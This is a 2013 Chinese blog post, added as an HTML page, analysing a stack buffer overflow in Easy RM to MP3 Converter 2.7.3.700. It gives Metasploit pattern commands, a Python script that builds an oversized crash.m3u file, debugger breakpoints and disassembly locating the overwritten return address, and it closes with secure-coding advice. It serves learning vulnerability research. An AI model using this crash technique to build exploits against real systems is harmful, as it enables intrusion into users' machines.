@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Easy RM to MP3 Converter(version 2.7.3.700)缓冲区溢出利用 - 忆杰的博客 - 专注于软件逆向、调试、反调试、内核开发、硬件虚拟化</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="忆杰" /><meta name="description" content="看了&amp;laquo;Oday安全软件漏洞分析技术&amp;raquo;这本书, 在开始入手之前有一个缓冲区溢出的实例, 不过我感觉那个溢出实例不够接近实战" /><meta name="keywords" content="忆杰的博客, 软件逆向, 调试, 反调试, 驱动开发, 应用开发, 内核开发, VT技术, 硬件虚拟化" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.98.0 with theme even" />
+
+
+<link rel="canonical" href="https://xchen.com/post/easy-rm-to-mp3-converterversion-2-7-3-700%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8-txt/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.b5a744db6de49a86cadafb3b70f555ab443f83c307a483402259e94726b045ff.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Easy RM to MP3 Converter(version 2.7.3.700)缓冲区溢出利用" />
+<meta property="og:description" content="看了&laquo;Oday安全软件漏洞分析技术&raquo;这本书, 在开始入手之前有一个缓冲区溢出的实例, 不过我感觉那个溢出实例不够接近实战" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://xchen.com/post/easy-rm-to-mp3-converterversion-2-7-3-700%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8-txt/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2013-08-09T00:00:00+00:00" />
+<meta property="article:modified_time" content="2013-08-09T00:00:00+00:00" />
+
+<meta itemprop="name" content="Easy RM to MP3 Converter(version 2.7.3.700)缓冲区溢出利用">
+<meta itemprop="description" content="看了&laquo;Oday安全软件漏洞分析技术&raquo;这本书, 在开始入手之前有一个缓冲区溢出的实例, 不过我感觉那个溢出实例不够接近实战"><meta itemprop="datePublished" content="2013-08-09T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2013-08-09T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1423">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Easy RM to MP3 Converter(version 2.7.3.700)缓冲区溢出利用"/>
+<meta name="twitter:description" content="看了&laquo;Oday安全软件漏洞分析技术&raquo;这本书, 在开始入手之前有一个缓冲区溢出的实例, 不过我感觉那个溢出实例不够接近实战"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">忆杰的博客</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">忆杰的博客</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Easy RM to MP3 Converter(version 2.7.3.700)缓冲区溢出利用</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2013-08-09 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"> 漏洞挖掘 </a>
+            </div>
+          <span class="more-meta"> 约 1423 字 </span>
+          <span class="more-meta"> 预计阅读 3 分钟 </span>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents"></nav>
+  </div>
+</div>
+    <div class="post-content">
+      <p> </p>
+<p>看了&laquo;Oday安全软件漏洞分析技术&raquo;这本书, 在开始入手之前有一个缓冲区溢出的实例, 不过我感觉那个溢出实例不够接近实战.. 刚好看雪有一篇&laquo;Exploit 编写教程第一篇：基于栈的溢出&raquo; 网上也有一哥们做实验.我也写个分析文章. 算是第一篇漏洞挖掘手记.</p>
+<p><a href="http://blog.csdn.net/yuzl32/article/details/6126592">http://blog.csdn.net/yuzl32/article/details/6126592</a></p>
+<p>这个程序有一个缓冲区溢出漏洞, 我也写篇文章, 代表下正式进入学习漏洞挖掘的行列.</p>
+<p>殊不知, 漏洞挖掘现在也是有一系列专门定制的工具, 使用这些工具, 就可以使一个不懂汇编, 甚至不懂编程的人, 也可以找几个漏洞玩玩. 不过我觉得工具毕竟是工具, 有好的工具当然可以使用,但是如果只会用工具就麻烦了..</p>
+<p>不多说, 前面那篇博客基本上已经把漏洞的各方面都讲到了. 我再说意义也不大. 我就从二进制层面看看这个漏洞产生的原因. 我就不多说了. 首先用metasploit 生成5000BYTE的数据, 用于定位异常的位置</p>
+<p>ruby C:\metasploit\apps\pro\msf3\tools\pattern_create.rb 5000</p>
+<p>copy, 保存成pattern.txt. 然后写一段python代码. python干活很快..用python写几行代码, 估计用C要即使行. 就是快.</p>
+<p>FileName = &ldquo;crash.m3u&rdquo;
+FilePattern = &ldquo;pattern.txt&rdquo;</p>
+<p>f = open( FileName, &lsquo;w&rsquo; )
+fp = open( FilePattern, &lsquo;r&rsquo; )</p>
+<p>for i in range( 0, 15000 ):
+f.write( &ldquo;A&rdquo; )</p>
+<p>Buffer = fp.read()
+f.write( Buffer )</p>
+<p>fp.close()
+f.close()</p>
+<p> </p>
+<p>这段代码会在当前目录下生成一个crash.m3u文件. 然后用Easy RM to MP3 Converter打开. 结果程序崩溃. 崩溃好啊. 崩溃就意味着有bug. 有bug就意味着可能有漏洞. 用metasploit看看崩溃的偏移.</p>
+<p>ruby C:\metasploit\apps\pro\msf3\tools\pattern_offset.rb 0x306c4239 5000</p>
+<p>用OllyDbg打开Easy RM to MP3 Converter下个条件断点.</p>
+<p>bp CreateFileA,[STRING[esp+4]]==&ldquo;c:\\crash.m3u&rdquo;</p>
+<p>如果是UNICODE，就用bp CreateFileW,[UNICODE[ESP+4]]==&ldquo;c:\\crash.m3u&rdquo;</p>
+<p>因为我的文件放在C盘. 所以是c:\crash.m3u. 程序跑起来, 结果断点断在了调用fopen的地方. 然后跟一下. 发现下面这个函数里面崩溃.</p>
+<p> </p>
+<p>0041BCF3  |.  E8 38D0FFFF   call    00418D30
+0041BCF8  |.  55            push    ebp
+0041BCF9  |.  8BCB          mov     ecx, ebx
+0041BCFB  |.  E8 B0250000   call    0041E2B0                         ;  这个函数崩溃
+0041BD00  |.  5F            pop     edi
+0041BD01  |.  5E            pop     esi</p>
+<p> </p>
+<p>跟进去分析分析. 定位到了..</p>
+<p>0041E3D5  |.  C2 0400       retn    4
+0041E3D8  |&gt;  B9 80080000   mov     ecx, 880                                                ;  这是Buffer大小880*4 = 0x2200 BYTE
+0041E3DD  |.  33C0          xor     eax, eax
+0041E3DF  |.  8DBC24 286700&gt;lea     edi, dword ptr [esp+6728]                               ;  这是Buffer开始地址000FD528
+0041E3E6  |.  F3:AB         rep     stos dword ptr es:[edi]
+0041E3E8  |.  8D8C24 282300&gt;lea     ecx, dword ptr [esp+2328]
+0041E3EF  |.  51            push    ecx                                                     ;  00DB8D40
+0041E3F0  |.  FF93 72640000 call    dword ptr [ebx+6472]                                    ;  这里面读取的数据越界了,
+0041E3F6  |.  83C4 04       add     esp, 4                                                  ;  覆盖了000FD528 + 880 * 4
+0041E3F9  |.  85C0          test    eax, eax
+0041E3FB  |.  0F84 D1050000 je      0041E9D2
+0041E401  |&gt;  BF B4734400   /mov     edi, 004473B4                                          ;  ASCII &ldquo;PNM&rdquo;
+0041E406  |.  83C9 FF       |or      ecx, FFFFFFFF</p>
+<p>就是0041E3F0的call dword ptr [ebx+6472] 里面代码出问题了.. 这边开的Buffer是0x880*4=0x2200.. 结果我们的文件用30000个字节, 给撑爆了. 覆盖了返回地址..典型的缓冲区溢出漏洞..</p>
+<p> </p>
+<p>具体的在OllyDbg和IDA里面的分析流程我就不贴了. 这个只是个人经验. 谈到这个缓冲区溢出的我就想多说两句. 我也想问我自己, 我原来写的代码有没有这种漏洞呢? 肯定有, strcpy的时候不考虑缓冲区长度. strcpy考虑了长度还有文件读取什么的. 写出来的代码没有出错. 只是因为没有用这个无效数据进行输入.拿几个无效数据试试, 才发现写的程序是那么的脆弱.</p>
+<p>缓冲区溢出的漏洞, 是最好用的一种漏洞.这种漏洞的产生也不应该, 大部分都是写代码粗心照成的. 当然隐藏很深的除外了.. 那么以后写代码的时候, 这一类的函数就千万不要用了lstrcpy, lstrcat, strcat, strcpy.等等, 当然有这一类的函数也预示着可能有漏洞利用的可能. 另外文件读取进来分析的时候也不要想当然.. 不少bug都是在解析字符串. 解析文件出现的.. 也标志着不少的漏洞..</p>
+<p>当然. 漏洞挖掘的路, 任重而道远. 走出第一步&hellip;</p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">忆杰</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2013-08-09
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/ida-%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BB%93%E6%9E%84%E4%BD%93%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%93%8D%E4%BD%9C%E6%96%B9%E6%B3%95/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">IDA 自定义结构体快捷键操作方法</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/kifastcallentry-kiserviceexit/">
+            <span class="next-text nav-default">KiFastCallEntry KiServiceExit</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="chen-yijie/utterances-Comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:chen-yijie@qq.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/chen-yijie" class="iconfont icon-github" title="github"></a>
+      <a href="https://www.zhihu.com/people/joen88" class="iconfont icon-zhihu" title="zhihu"></a>
+  <a href="https://xchen.com/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>忆杰</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.64437849d125a2d603b3e71d6de5225d641a32d17168a58106e0b61852079683.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
